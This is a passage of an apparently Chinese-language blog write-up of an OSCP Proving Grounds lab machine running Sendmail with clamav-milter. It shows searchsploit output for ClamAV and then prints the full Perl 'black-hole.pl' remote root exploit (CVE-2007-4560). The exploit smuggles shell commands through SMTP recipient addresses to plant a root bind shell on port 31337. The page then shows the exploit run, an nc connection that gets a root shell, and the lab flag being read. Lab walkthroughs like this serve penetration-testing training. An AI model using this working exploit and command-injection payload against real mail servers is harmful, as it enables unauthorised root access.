+</span></span><span class="line"><span class="cl"> Exploit Title                                                        <span class="p">|</span>  Path
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">Clam Anti-Virus ClamAV 0.88.x - UPX Compressed PE File Heap Buffer Ov <span class="p">|</span> linux/dos/28348.txt
+</span></span><span class="line"><span class="cl">ClamAV / UnRAR - .RAR Handling Remote Null Pointer Dereference        <span class="p">|</span> linux/remote/30291.txt
+</span></span><span class="line"><span class="cl">ClamAV 0.91.2 - libclamav MEW PE Buffer Overflow                      <span class="p">|</span> linux/remote/4862.py
+</span></span><span class="line"><span class="cl">ClamAV &lt; 0.102.0 - <span class="s1">&#39;bytecode_vm&#39;</span> Code Execution                       <span class="p">|</span> linux/local/47687.py
+</span></span><span class="line"><span class="cl">ClamAV &lt; 0.94.2 - JPEG Parsing Recursive Stack Overflow <span class="o">(</span>PoC<span class="o">)</span>         <span class="p">|</span> multiple/dos/7330.c
+</span></span><span class="line"><span class="cl">ClamAV Daemon 0.65 - UUEncoded Message Denial of Service              <span class="p">|</span> linux/dos/23667.txt
+</span></span><span class="line"><span class="cl">ClamAV Milter - Blackhole-Mode Remote Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>     <span class="p">|</span> linux/remote/16924.rb
+</span></span><span class="line"><span class="cl">ClamAV Milter 0.92.2 - Blackhole-Mode <span class="o">(</span>Sendmail<span class="o">)</span> Code Execution <span class="o">(</span>Meta <span class="p">|</span> multiple/remote/9913.rb
+</span></span><span class="line"><span class="cl">Sendmail with clamav-milter &lt; 0.91.2 - Remote Command Execution       <span class="p">|</span> multiple/remote/4761.pl
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">Shellcodes: No Results
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl"> Paper Title                                                          <span class="p">|</span>  Path
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Azerbaijan<span class="o">]</span> ClamAV Bypassing                                         <span class="p">|</span> docs/azerbaijan/31685-<span class="o">[</span>azerbaija
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl"> </span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/8-ClamAV<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ searchsploit -m <span class="m">4761</span> 
+</span></span><span class="line"><span class="cl">  Exploit: Sendmail with clamav-milter &lt; 0.91.2 - Remote Command Execution
+</span></span><span class="line"><span class="cl">      URL: https://www.exploit-db.com/exploits/4761
+</span></span><span class="line"><span class="cl">     Path: /usr/share/exploitdb/exploits/multiple/remote/4761.pl
+</span></span><span class="line"><span class="cl">    Codes: CVE-2007-4560
+</span></span><span class="line"><span class="cl"> Verified: True
+</span></span><span class="line"><span class="cl">File Type: ASCII text
+</span></span><span class="line"><span class="cl">Copied to: /home/xavier/Desktop/OSCP/PG_Practice/8-ClamAV/4761.pl</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"><span class="line"><span class="cl"><span class="c1">### black-hole.pl</span>
+</span></span><span class="line"><span class="cl"><span class="c1">### Sendmail w/ clamav-milter Remote Root Exploit</span>
+</span></span><span class="line"><span class="cl"><span class="c1">### Copyright (c) 2007 Eliteboy</span>
+</span></span><span class="line"><span class="cl"><span class="c1">########################################################</span>
+</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">IO::Socket</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">print</span> <span class="s">&#34;Sendmail w/ clamav-milter Remote Root Exploit\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">print</span> <span class="s">&#34;Copyright (C) 2007 Eliteboy\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$#ARGV</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">print</span> <span class="s">&#34;Give me a host to connect.\n&#34;</span><span class="p">;</span><span class="nb">exit</span><span class="p">;}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">print</span> <span class="s">&#34;Attacking $ARGV[0]...\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$sock</span> <span class="o">=</span> <span class="nn">IO::Socket::INET</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">(</span><span class="n">PeerAddr</span> <span class="o">=&gt;</span> <span class="nv">$ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">                              <span class="n">PeerPort</span> <span class="o">=&gt;</span> <span class="s">&#39;25&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                              <span class="n">Proto</span>    <span class="o">=&gt;</span> <span class="s">&#39;tcp&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">print</span> <span class="nv">$sock</span> <span class="s">&#34;ehlo you\r\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">print</span> <span class="nv">$sock</span> <span class="s">&#34;mail from: &lt;&gt;\r\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">print</span> <span class="nv">$sock</span> <span class="s">&#34;rcpt to: &lt;nobody+\&#34;|echo &#39;31337 stream tcp nowait root /bin/sh -i&#39; &gt;&gt; /etc/inetd.conf\&#34;@localhost&gt;\r\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">print</span> <span class="nv">$sock</span> <span class="s">&#34;rcpt to: &lt;nobody+\&#34;|/etc/init.d/inetd restart\&#34;@localhost&gt;\r\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">print</span> <span class="nv">$sock</span> <span class="s">&#34;data\r\n.\r\nquit\r\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="p">(</span><span class="sr">&lt;$sock&gt;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">print</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># milw0rm.com [2007-12-21]</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>该脚本执行后，会用root权限执行一个/bin/sh ，在31337端口进行监听</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/8-ClamAV<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ perl 4761.pl 192.168.193.42
+</span></span><span class="line"><span class="cl">Sendmail w/ clamav-milter Remote Root Exploit
+</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2007</span> Eliteboy
+</span></span><span class="line"><span class="cl">Attacking 192.168.193.42...
+</span></span><span class="line"><span class="cl"><span class="m">220</span> localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3<span class="p">;</span> Sun, <span class="m">17</span> Dec <span class="m">2023</span> 07:11:16 -0500<span class="p">;</span> <span class="o">(</span>No UCE/UBE<span class="o">)</span> logging access from: <span class="o">[</span>192.168.45.174<span class="o">](</span>FAIL<span class="o">)</span>-<span class="o">[</span>192.168.45.174<span class="o">]</span>
+</span></span><span class="line"><span class="cl">250-localhost.localdomain Hello <span class="o">[</span>192.168.45.174<span class="o">]</span>, pleased to meet you
+</span></span><span class="line"><span class="cl">250-ENHANCEDSTATUSCODES
+</span></span><span class="line"><span class="cl">250-PIPELINING
+</span></span><span class="line"><span class="cl">250-EXPN
+</span></span><span class="line"><span class="cl">250-VERB
+</span></span><span class="line"><span class="cl">250-8BITMIME
+</span></span><span class="line"><span class="cl">250-SIZE
+</span></span><span class="line"><span class="cl">250-DSN
+</span></span><span class="line"><span class="cl">250-ETRN
+</span></span><span class="line"><span class="cl">250-DELIVERBY
+</span></span><span class="line"><span class="cl"><span class="m">250</span> HELP
+</span></span><span class="line"><span class="cl"><span class="m">250</span> 2.1.0 &lt;&gt;... Sender ok
+</span></span><span class="line"><span class="cl"><span class="m">250</span> 2.1.5 &lt;nobody+<span class="s2">&#34;|echo &#39;31337 stream tcp nowait root /bin/sh -i&#39; &gt;&gt; /etc/inetd.conf&#34;</span>&gt;... Recipient ok
+</span></span><span class="line"><span class="cl"><span class="m">250</span> 2.1.5 &lt;nobody+<span class="s2">&#34;|/etc/init.d/inetd restart&#34;</span>&gt;... Recipient ok
+</span></span><span class="line"><span class="cl"><span class="m">354</span> Enter mail, end with <span class="s2">&#34;.&#34;</span> on a line by itself
+</span></span><span class="line"><span class="cl"><span class="m">250</span> 2.0.0 3BHCBGXD005199 Message accepted <span class="k">for</span> delivery
+</span></span><span class="line"><span class="cl"><span class="m">221</span> 2.0.0 localhost.localdomain closing connection
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/8-ClamAV<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nc 192.168.193.42 <span class="m">31337</span> 
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">cat /root/proof.txt
+</span></span><span class="line"><span class="cl">09d91935b96ac1aa8ce31d30e77c9978</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2023-12-17 07:14:01">更新于 2023-12-17&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/oscp/" class="post-tag" title="标签 - OSCP">OSCP</a><a href="/tags/pg_practice/" class="post-tag" title="标签 - PG_Practice">PG_Practice</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/provinggrounds-hub/" class="post-nav-item" rel="prev" title="ProvingGrouds Hub WriteUp"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>ProvingGrouds Hub WriteUp</a><a href="/posts/provinggrounds-planetexpress/" class="post-nav-item" rel="next" title="ProvingGrounds PlanetExpress Writeup">ProvingGrounds PlanetExpress Writeup<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"twemoji":true,"version":"v0.3.16"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
